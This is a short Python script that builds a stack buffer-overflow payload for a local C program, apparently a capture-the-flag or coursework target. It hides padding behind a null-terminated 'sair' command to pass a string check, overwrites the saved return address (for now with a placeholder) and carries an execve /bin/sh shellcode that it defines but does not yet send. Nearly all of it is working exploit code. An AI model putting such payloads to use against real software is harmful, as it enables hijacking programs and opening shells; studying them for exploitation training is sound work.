import sys

# Buffer start address: 0x7fffffffdbc4

# Target function address: 0x5555555582a3

# The "Processar_Comando" function returns at:  0x0000555555558592

# 0x7fffffffdd38: "ABCD1234"

# 1. Select difficulty
sys.stdout.buffer.write(b"1\n")

# 2. The Command
# We start with 'sair' and a NULL terminator \x00
# This makes strcmp think the string is just "sair"
# But scanf keeps reading the rest of the padding into the stack!
command = b"sair\x00"

# 3. The Padding
padding = b"\x00" * (979)

# 4. The Target RIP
# target_rip = b"\xa3\x82\x55\x55\x55\x55\x55\x55"
# target_rip = b"\xc4\xdb\xff\xff\xff\x7f\x00\x00"
target_rip = b"ABCD1234"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"

# 5. Execute
sys.stdout.buffer.write(command + padding + target_rip + b"\n")

# With the way the payload is right now, after executing, the code points to "target_rip".